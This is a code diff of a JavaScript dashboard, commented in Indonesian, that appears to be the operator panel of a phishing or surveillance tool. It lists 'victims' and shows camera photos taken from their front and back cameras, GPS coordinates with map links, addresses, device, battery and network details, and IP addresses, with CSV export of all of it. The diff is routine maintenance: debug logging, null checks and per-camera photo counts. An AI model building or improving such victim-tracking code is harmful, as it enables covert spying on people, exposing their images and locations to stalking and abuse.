@@ -116,9 +116,20 @@ function filterVictimsData(data) {
 
 // ============= FUNGSI RENDER FOTO UNTUK MULTIPLE CAMERA =============
 
-// Fungsi untuk render foto (support multiple camera)
+// Fungsi untuk render foto (support multiple camera) - DIPERBAIKI
 function renderPhotos(victimId, cameraStatus) {
   const victimPhotos = photos[victimId];
+
+  // Debug log untuk melihat data
+  console.log(`🎨 Rendering photos for ${victimId}:`, {
+    hasPhotos: !!victimPhotos,
+    isArray: Array.isArray(victimPhotos),
+    length: victimPhotos?.length || 0,
+    frontCount:
+      victimPhotos?.filter((p) => p?.cameraType === "front").length || 0,
+    backCount:
+      victimPhotos?.filter((p) => p?.cameraType === "back").length || 0,
+  });
 
   // Jika tidak ada foto sama sekali
   if (
@@ -129,14 +140,11 @@ function renderPhotos(victimId, cameraStatus) {
     return cameraStatus === "granted" ? "Mengambil foto..." : "Tidak ada foto";
   }
 
-  // Ambil 5 foto terakhir
-  const recentPhotos = victimPhotos.slice(-5).reverse();
-
   // Kelompokkan berdasarkan tipe kamera
-  const frontPhotos = victimPhotos.filter((p) => p.cameraType === "front");
-  const backPhotos = victimPhotos.filter((p) => p.cameraType === "back");
+  const frontPhotos = victimPhotos.filter((p) => p && p.cameraType === "front");
+  const backPhotos = victimPhotos.filter((p) => p && p.cameraType === "back");
   const otherPhotos = victimPhotos.filter(
-    (p) => p.cameraType !== "front" && p.cameraType !== "back",
+    (p) => p && p.cameraType !== "front" && p.cameraType !== "back",
   );
 
   let html = "";
@@ -145,67 +153,68 @@ function renderPhotos(victimId, cameraStatus) {
   if (frontPhotos.length > 0) {
     const lastFront = frontPhotos[frontPhotos.length - 1];
     html += `
-            <div style="border-left: 3px solid #00ff9d; padding-left: 10px; margin-bottom: 15px;">
-                <div style="font-size: 11px; margin-bottom: 5px; color: #00ff9d;">📱 KAMERA DEPAN</div>
-                <img src="${lastFront.image}" class="photo-preview" 
-                     onclick="showPhotoWithType('${victimId}', 'front')"
-                     style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
-                <div style="font-size: 10px; color: #888; margin-top: 3px;">
-                    ${new Date(lastFront.timestamp).toLocaleTimeString()}
-                    ${frontPhotos.length > 1 ? ` | Total: ${frontPhotos.length} foto` : ""}
-                </div>
-            </div>
-        `;
+      <div style="border-left: 3px solid #00ff9d; padding-left: 10px; margin-bottom: 15px;">
+        <div style="font-size: 11px; margin-bottom: 5px; color: #00ff9d;">📱 KAMERA DEPAN</div>
+        <img src="${lastFront.image}" class="photo-preview" 
+             onclick="showPhotoWithType('${victimId}', 'front')"
+             style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
+        <div style="font-size: 10px; color: #888; margin-top: 3px;">
+          ${lastFront.timestamp ? new Date(lastFront.timestamp).toLocaleTimeString() : "Waktu tidak tersedia"}
+          ${frontPhotos.length > 1 ? ` | Total: ${frontPhotos.length} foto` : ""}
+        </div>
+      </div>
+    `;
   }
 
   // Tampilkan foto kamera belakang
   if (backPhotos.length > 0) {
     const lastBack = backPhotos[backPhotos.length - 1];
     html += `
-            <div style="border-left: 3px solid #ff4444; padding-left: 10px; margin-bottom: 15px;">
-                <div style="font-size: 11px; margin-bottom: 5px; color: #ff8888;">📱 KAMERA BELAKANG</div>
-                <img src="${lastBack.image}" class="photo-preview" 
-                     onclick="showPhotoWithType('${victimId}', 'back')"
-                     style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
-                <div style="font-size: 10px; color: #888; margin-top: 3px;">
-                    ${new Date(lastBack.timestamp).toLocaleTimeString()}
-                    ${backPhotos.length > 1 ? ` | Total: ${backPhotos.length} foto` : ""}
-                </div>
-            </div>
-        `;
+      <div style="border-left: 3px solid #ff4444; padding-left: 10px; margin-bottom: 15px;">
+        <div style="font-size: 11px; margin-bottom: 5px; color: #ff8888;">📱 KAMERA BELAKANG</div>
+        <img src="${lastBack.image}" class="photo-preview" 
+             onclick="showPhotoWithType('${victimId}', 'back')"
+             style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
+        <div style="font-size: 10px; color: #888; margin-top: 3px;">
+          ${lastBack.timestamp ? new Date(lastBack.timestamp).toLocaleTimeString() : "Waktu tidak tersedia"}
+          ${backPhotos.length > 1 ? ` | Total: ${backPhotos.length} foto` : ""}
+        </div>
+      </div>
+    `;
   }
 
-  // Tampilkan foto lain (fallback, default, dll)
-  if (
-    otherPhotos.length > 0 &&
-    frontPhotos.length === 0 &&
-    backPhotos.length === 0
-  ) {
+  // Tampilkan foto lain (fallback, default, dll) - TAMPILKAN JIKA ADA
+  if (otherPhotos.length > 0) {
     const lastOther = otherPhotos[otherPhotos.length - 1];
     let cameraLabel = "";
     if (lastOther.cameraType === "single") cameraLabel = "📷 KAMERA";
     else if (lastOther.cameraType === "fallback") cameraLabel = "🔄 FALLBACK";
-    else cameraLabel = "📸 FOTO";
+    else if (lastOther.cameraType === "default") cameraLabel = "📷 DEFAULT";
+    else cameraLabel = `📸 ${lastOther.cameraType || "FOTO"}`;
 
     html += `
-            <div style="border-left: 3px solid #ffaa00; padding-left: 10px;">
-                <div style="font-size: 11px; margin-bottom: 5px; color: #ffaa00;">${cameraLabel}</div>
-                <img src="${lastOther.image}" class="photo-preview" 
-                     onclick="showPhotoWithType('${victimId}', '${lastOther.cameraType}')"
-                     style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
-                <div style="font-size: 10px; color: #888; margin-top: 3px;">
-                    ${new Date(lastOther.timestamp).toLocaleTimeString()}
-                </div>
-            </div>
-        `;
+      <div style="border-left: 3px solid #ffaa00; padding-left: 10px; margin-bottom: 15px;">
+        <div style="font-size: 11px; margin-bottom: 5px; color: #ffaa00;">${cameraLabel}</div>
+        <img src="${lastOther.image}" class="photo-preview" 
+             onclick="showPhotoWithType('${victimId}', '${lastOther.cameraType}')"
+             style="max-width: 100%; max-height: 150px; border-radius: 5px; cursor: pointer;">
+        <div style="font-size: 10px; color: #888; margin-top: 3px;">
+          ${lastOther.timestamp ? new Date(lastOther.timestamp).toLocaleTimeString() : "Waktu tidak tersedia"}
+        </div>
+      </div>
+    `;
   }
 
-  // Tampilkan total foto
-  if (victimPhotos.length > 5) {
-    html += `<div style="font-size: 10px; color: #888; text-align: center; margin-top: 5px;">+ ${victimPhotos.length - 5} foto lainnya</div>`;
+  // Tampilkan total foto jika lebih dari yang ditampilkan
+  const totalDisplayed =
+    (frontPhotos.length > 0 ? 1 : 0) +
+    (backPhotos.length > 0 ? 1 : 0) +
+    (otherPhotos.length > 0 ? 1 : 0);
+  if (victimPhotos.length > totalDisplayed) {
+    html += `<div style="font-size: 10px; color: #888; text-align: center; margin-top: 5px;">+ ${victimPhotos.length - totalDisplayed} foto lainnya</div>`;
   }
 
-  return html;
+  return html || "Tidak ada foto yang tersedia";
 }
 
 // Fungsi showPhoto dengan dukungan tipe kamera
@@ -253,9 +262,9 @@ function showPhotoWithType(victimId, cameraType) {
             caption = "🔄 Fallback Camera";
             break;
           default:
-            caption = "📸 Foto";
+            caption = `📸 ${photoToShow.cameraType || "Foto"}`;
         }
-        caption += ` - ${new Date(photoToShow.timestamp).toLocaleString()}`;
+        caption += ` - ${photoToShow.timestamp ? new Date(photoToShow.timestamp).toLocaleString() : "Waktu tidak tersedia"}`;
         modalCaption.textContent = caption;
       }
     }
@@ -313,163 +322,163 @@ function renderVictim(victim) {
   const photosHtml = renderPhotos(victim.victimId, camera.status);
 
   card.innerHTML = `
-        <div class="victim-header">
-            <div>
-                <span class="victim-id">${victim.victimId}</span>
-                ${hasCamera}
-                ${hasLocation}
+    <div class="victim-header">
+      <div>
+        <span class="victim-id">${victim.victimId}</span>
+        ${hasCamera}
+        ${hasLocation}
+      </div>
+      <span class="timestamp">${dateStr} ${timeStr}</span>
+    </div>
+    
+    <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
+      <span>
+        <span class="camera-indicator ${camera.status === "granted" ? "camera-active" : ""}"></span> 
+        Camera: ${camera.status || "Belum diminta"}
+      </span>
+      <span>
+        <span class="camera-indicator ${location.status === "granted" ? "location-active" : ""}"></span> 
+        Location: ${location.status || "Belum diminta"}
+      </span>
+    </div>
+    
+    ${
+      location.status === "granted" && location.latitude
+        ? `
+      <div class="data-section">
+        <div class="data-title">📍 LOKASI GPS</div>
+        <div class="data-content">
+          <div class="info-row-dot">
+            <div class="info-label-dot">Latitude</div>
+            <div class="info-colon">:</div>
+            <div class="info-value-dot">${location.latitude}</div>
+          </div>
+          <div class="info-row-dot">
+            <div class="info-label-dot">Longitude</div>
+            <div class="info-colon">:</div>
+            <div class="info-value-dot">${location.longitude}</div>
+          </div>
+          <div class="info-row-dot">
+            <div class="info-label-dot">Akurasi</div>
+            <div class="info-colon">:</div>
+            <div class="info-value-dot">${location.accuracy || "N/A"} meter</div>
+          </div>
+          ${
+            location.altitude
+              ? `
+          <div class="info-row-dot">
+            <div class="info-label-dot">Altitude</div>
+            <div class="info-colon">:</div>
+            <div class="info-value-dot">${location.altitude} meter</div>
+          </div>
+          `
+              : ""
+          }
+          <div class="info-row-dot">
+            <div class="info-label-dot">Maps</div>
+            <div class="info-colon">:</div>
+            <div class="info-value-dot">
+              <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" 
+                 target="_blank" class="map-link">🔍 Buka di Google Maps</a>
             </div>
-            <span class="timestamp">${dateStr} ${timeStr}</span>
+          </div>
         </div>
-        
-        <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
-            <span>
-                <span class="camera-indicator ${camera.status === "granted" ? "camera-active" : ""}"></span> 
-                Camera: ${camera.status || "Belum diminta"}
-            </span>
-            <span>
-                <span class="camera-indicator ${location.status === "granted" ? "location-active" : ""}"></span> 
-                Location: ${location.status || "Belum diminta"}
-            </span>
+      </div>
+      `
+        : ""
+    }
+    
+    ${
+      data.location_address
+        ? `
+      <div class="data-section">
+        <div class="data-title">🏠 ALAMAT</div>
+        <div class="data-content">
+          ${data.location_address}
         </div>
-        
-        ${
-          location.status === "granted" && location.latitude
-            ? `
-        <div class="data-section">
-            <div class="data-title">📍 LOKASI GPS</div>
-            <div class="data-content">
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Latitude</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${location.latitude}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Longitude</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${location.longitude}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Akurasi</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${location.accuracy || "N/A"} meter</div>
-                </div>
-                ${
-                  location.altitude
-                    ? `
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Altitude</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${location.altitude} meter</div>
-                </div>
-                `
-                    : ""
-                }
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Maps</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">
-                        <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" 
-                           target="_blank" class="map-link">🔍 Buka di Google Maps</a>
-                    </div>
-                </div>
-            </div>
+      </div>
+      `
+        : ""
+    }
+    
+    <div class="data-section">
+      <div class="data-title">📱 INFO DEVICE</div>
+      <div class="data-content">
+        <div class="info-row-dot">
+          <div class="info-label-dot">Platform</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${platform}</div>
         </div>
-        `
-            : ""
-        }
-        
-        ${
-          data.location_address
-            ? `
-        <div class="data-section">
-            <div class="data-title">🏠 ALAMAT</div>
-            <div class="data-content">
-                ${data.location_address}
-            </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">Browser</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${userAgent.length > 60 ? userAgent.substring(0, 60) + "..." : userAgent}</div>
         </div>
-        `
-            : ""
-        }
-        
-        <div class="data-section">
-            <div class="data-title">📱 INFO DEVICE</div>
-            <div class="data-content">
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Platform</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${platform}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Browser</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${userAgent.length > 60 ? userAgent.substring(0, 60) + "..." : userAgent}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Screen</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${screenInfo}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Battery</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${batteryInfo}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Language</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${deviceInfo.language || "N/A"}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Timezone</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${deviceInfo.timezone || "N/A"}</div>
-                </div>
-            </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">Screen</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${screenInfo}</div>
         </div>
-        
-        <div class="data-section" id="photo-${victim.victimId}">
-            <div class="data-title">📸 FOTO KAMERA</div>
-            <div class="data-content" id="photo-content-${victim.victimId}">
-                ${photosHtml}
-            </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">Battery</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${batteryInfo}</div>
         </div>
-        
-        <div class="data-section">
-            <div class="data-title">🌐 NETWORK</div>
-            <div class="data-content">
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Online</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${network.online ? "Ya" : "Tidak"}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Koneksi</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${network.connection?.type || "N/A"}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">Kecepatan</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${network.connection?.downlink || "N/A"} Mbps</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">IP Public</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${ipPublic}</div>
-                </div>
-                <div class="info-row-dot">
-                    <div class="info-label-dot">IP Lokal</div>
-                    <div class="info-colon">:</div>
-                    <div class="info-value-dot">${ipLokal}</div>
-                </div>
-            </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">Language</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${deviceInfo.language || "N/A"}</div>
         </div>
-        
-        <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
-            ID: ${victim.victimId}
+        <div class="info-row-dot">
+          <div class="info-label-dot">Timezone</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${deviceInfo.timezone || "N/A"}</div>
         </div>
-    `;
+      </div>
+    </div>
+    
+    <div class="data-section" id="photo-${victim.victimId}">
+      <div class="data-title">📸 FOTO KAMERA</div>
+      <div class="data-content" id="photo-content-${victim.victimId}">
+        ${photosHtml}
+      </div>
+    </div>
+    
+    <div class="data-section">
+      <div class="data-title">🌐 NETWORK</div>
+      <div class="data-content">
+        <div class="info-row-dot">
+          <div class="info-label-dot">Online</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${network.online ? "Ya" : "Tidak"}</div>
+        </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">Koneksi</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${network.connection?.type || "N/A"}</div>
+        </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">Kecepatan</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${network.connection?.downlink || "N/A"} Mbps</div>
+        </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">IP Public</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${ipPublic}</div>
+        </div>
+        <div class="info-row-dot">
+          <div class="info-label-dot">IP Lokal</div>
+          <div class="info-colon">:</div>
+          <div class="info-value-dot">${ipLokal}</div>
+        </div>
+      </div>
+    </div>
+    
+    <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
+      ID: ${victim.victimId}
+    </div>
+  `;
 
   return card;
 }
@@ -600,9 +609,14 @@ socket.on("init-data", (initialData) => {
   updateVictimsList();
 });
 
-// Handle new photo (MULTIPLE CAMERA SUPPORT)
+// Handle new photo (MULTIPLE CAMERA SUPPORT) - DIPERBAIKI
 socket.on("new-photo", (data) => {
-  console.log("📸 New photo received:", data.victimId, data.cameraType);
+  console.log("📸 New photo received:", {
+    victimId: data.victimId,
+    cameraType: data.cameraType,
+    timestamp: data.timestamp,
+    imageLength: data.image?.length || 0,
+  });
 
   if (data && data.victimId && data.image) {
     // Inisialisasi array jika belum ada
@@ -610,10 +624,13 @@ socket.on("new-photo", (data) => {
       photos[data.victimId] = [];
     }
 
+    // Pastikan cameraType ada
+    const cameraType = data.cameraType || "unknown";
+
     // Tambahkan foto baru ke array
     const photoData = {
       image: data.image,
-      cameraType: data.cameraType || "unknown",
+      cameraType: cameraType,
       timestamp: data.timestamp || new Date().toISOString(),
     };
 
@@ -623,6 +640,17 @@ socket.on("new-photo", (data) => {
     if (photos[data.victimId].length > 20) {
       photos[data.victimId] = photos[data.victimId].slice(-20);
     }
+
+    // Log statistik
+    const frontCount = photos[data.victimId].filter(
+      (p) => p.cameraType === "front",
+    ).length;
+    const backCount = photos[data.victimId].filter(
+      (p) => p.cameraType === "back",
+    ).length;
+    console.log(
+      `📊 Stats for ${data.victimId}: Front: ${frontCount}, Back: ${backCount}, Total: ${photos[data.victimId].length}`,
+    );
 
     // Update tampilan di card
     const victim = victims.find((v) => v.victimId === data.victimId);
@@ -638,10 +666,6 @@ socket.on("new-photo", (data) => {
       // Jika container belum ada, refresh list
       updateVictimsList();
     }
-
-    console.log(
-      `📊 Total photos for ${data.victimId}: ${photos[data.victimId].length}`,
-    );
   }
 });
 
@@ -677,10 +701,18 @@ function exportData() {
 
 function exportCSV() {
   let csv =
-    "Victim ID,Timestamp,IP,Camera,Location,Latitude,Longitude,Photos Count,Browser,Platform\n";
+    "Victim ID,Timestamp,IP,Camera,Location,Latitude,Longitude,Photos Count,Front Photos,Back Photos,Browser,Platform\n";
 
   victims.forEach((v) => {
-    const photoCount = photos[v.victimId] ? photos[v.victimId].length : 0;
+    const victimPhotos = photos[v.victimId] || [];
+    const photoCount = victimPhotos.length;
+    const frontCount = victimPhotos.filter(
+      (p) => p.cameraType === "front",
+    ).length;
+    const backCount = victimPhotos.filter(
+      (p) => p.cameraType === "back",
+    ).length;
+
     const row = [
       v.victimId || "",
       v.timestamp || "",
@@ -690,6 +722,8 @@ function exportCSV() {
       v.data?.location?.latitude || "",
       v.data?.location?.longitude || "",
       photoCount,
+      frontCount,
+      backCount,
       (v.data?.device_info?.userAgent || "")
         .replace(/,/g, " ")
         .substring(0, 100),
@@ -744,6 +778,29 @@ function setFilter(filter) {
   }
 
   updateVictimsList();
+}
+
+// Debug function untuk melihat data photos
+function debugPhotos() {
+  console.log("=== PHOTOS DEBUG ===");
+  console.log("photos object:", photos);
+  Object.keys(photos).forEach((victimId) => {
+    console.log(`Victim: ${victimId}`);
+    console.log(`  Photos array length: ${photos[victimId]?.length || 0}`);
+    if (photos[victimId] && Array.isArray(photos[victimId])) {
+      photos[victimId].forEach((p, i) => {
+        console.log(
+          `  [${i}] cameraType: ${p.cameraType}, timestamp: ${p.timestamp}`,
+        );
+      });
+    } else {
+      console.log(
+        `  WARNING: photos[${victimId}] is not an array!`,
+        photos[victimId],
+      );
+    }
+  });
+  alert("Cek console untuk detail photos");
 }
 
 // Modal functions
